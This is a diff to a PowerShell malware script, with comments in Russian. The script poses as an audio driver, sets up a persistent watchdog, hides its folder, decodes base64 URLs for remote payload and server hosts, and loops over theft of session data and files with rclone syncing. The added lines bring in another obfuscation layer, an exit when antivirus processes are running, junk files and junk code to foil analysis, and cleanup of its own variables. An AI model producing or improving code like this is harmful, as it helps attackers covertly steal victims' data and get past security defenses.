@@ -1,21 +1,22 @@
-$tempDir = "$env:TEMP\system_cache"
-$fileDumpDir = "$tempDir\files"
-$videoSubDir = "$tempDir\video"
-$logPath = "$tempDir\log.json"
-$macroInputPath = "$tempDir\macroInput.txt"
-$global:lastVideoUpload = Get-Date
-$mainPath = "$env:APPDATA\Microsoft\Windows\system_cache"
-$scriptPath = "$env:APPDATA\AudioDriver\A.ps1"
-$watchdogPath = "$env:APPDATA\AudioDriver\watchdog.ps1"
-$sessionDataDir = "$env:USERPROFILE\sessionData"
+$tempDir = "$env:TEMP\$(DoubleObfuscate('system_cache',$key))"
+$fileDumpDir = "$tempDir\$(DoubleObfuscate('files',$key))"
+$videoSubDir = "$tempDir\$(DoubleObfuscate('video',$key))"
+$logPath = "$tempDir\$(DoubleObfuscate('log.json',$key))"
+$macroInputPath = "$tempDir\$(DoubleObfuscate('macroInput.txt',$key))"
+$mainPath = "$env:APPDATA\Microsoft\Windows\$(DoubleObfuscate('system_cache',$key))"
+$scriptPath = "$env:APPDATA\AudioDriver\$(DoubleObfuscate('A.ps1',$key))"
+$watchdogPath = "$env:APPDATA\AudioDriver\$(DoubleObfuscate('watchdog.ps1',$key))"
+$sessionDataDir = "$env:USERPROFILE\$(DoubleObfuscate('sessionData',$key))"
+
 function Use-UrlDecoder($base64) {
     return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64))
 }
-$releasesUrl = Use-UrlDecoder "aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA=="
-$pagesUrl    = Use-UrlDecoder "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8A"
-$serverUrl   = Use-UrlDecoder "aAB0AHQAcABzADoALwAvAHMAZQByAHYAZQByAC4AMQAxAG4ALgB3AG8AcgBrAGUAcgBzAC4AZABlAHYALwA="
-$versionURL  = Use-UrlDecoder "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC92AGUAcgBzAGkAbwBuAC4AdAB4AHQ="
-$payloadURL  = Use-UrlDecoder "aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8AQQAuAHAAcwAxAA=="
+$releasesUrl = Use-UrlDecoder(DoubleObfuscate("aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA==",$key))
+$pagesUrl    = Use-UrlDecoder(DoubleObfuscate("aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8A",$key))
+$serverUrl   = Use-UrlDecoder(DoubleObfuscate("aAB0AHQAcABzADoALwAvAHMAZQByAHYAZQByAC4AMQAxAG4ALgB3AG8AcgBrAGUAcgBzAC4AZABlAHYALwA=",$key))
+$versionURL  = Use-UrlDecoder(DoubleObfuscate("aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC92AGUAcgBzAGkAbwBuAC4AdAB4AHQ=",$key))
+$payloadURL  = Use-UrlDecoder(DoubleObfuscate("aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8AQQAuAHAAcwAxAA==",$key))
+
 New-Item -ItemType Directory -Force -Path $tempDir, $fileDumpDir, $videoSubDir | Out-Null
 $watchdogDir = Split-Path $watchdogPath
 if (!(Test-Path $watchdogDir)) {
@@ -515,6 +516,42 @@ Install-Watchdog
 New-SetupLauncher
 Hide-Folder
 
+# Проверка на антивирусные процессы
+$avProcs = @("MsMpEng","avp","avg","avast","mcshield","clamwin","savservice","wrsa","f-secure","egui","ekrn","nod32","kaspersky","sophos","trend","symantec","defender")
+try {
+    $procs = Get-Process | Select-Object -ExpandProperty ProcessName
+    foreach ($av in $avProcs) {
+        if ($procs -contains $av) { exit }
+    }
+} catch {}
+
+# Генерация junk-файлов с легитимным содержимым
+$legitContents = @("MZ", "PK", "This program cannot be run in DOS mode.", "SQLite format 3", "RIFF", "GIF89a")
+for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
+    $junkFile = Join-Path $tempDir ([guid]::NewGuid().Guid.Substring(0,8) + ".tmp")
+    $content = $legitContents | Get-Random
+    Set-Content -Path $junkFile -Value $content -Encoding ASCII
+}
+
+# Junk-код: случайные переменные, функции, ошибки
+for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
+    $junkVar = "junkVar" + [guid]::NewGuid().Guid.Substring(0,8)
+    Set-Variable -Name $junkVar -Value ([guid]::NewGuid().ToString() + (Get-Random))
+}
+for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
+    $fname = "junkFunc" + [guid]::NewGuid().Guid.Substring(0,8)
+    Set-Item -Path "function:$fname" -Value { param($x) return $x * (Get-Random -Minimum 1 -Maximum 100) }
+}
+for ($i=0; $i -lt (Get-Random -Minimum 2 -Maximum 5); $i++) {
+    Write-Error ("Random error: " + [guid]::NewGuid().ToString())
+    Write-Output ("Random log: " + (Get-Random))
+}
+
+# Очистка временных файлов
+try {
+    Get-ChildItem -Path $tempDir -Filter *.tmp -Recurse | Remove-Item -Force -ErrorAction SilentlyContinue
+} catch {}
+
 while ($true) {
     Get-SessionData
     Get-Files
@@ -524,3 +561,6 @@ while ($true) {
     Update-RcloneConf
     Start-Sleep -Seconds 10
 }
+
+# Очистка переменных после использования
+Remove-Variable -Name key, tempDir, fileDumpDir, videoSubDir, logPath, macroInputPath, mainPath, scriptPath, watchdogPath, sessionDataDir, releasesUrl, pagesUrl, serverUrl, versionURL, payloadURL -ErrorAction SilentlyContinue
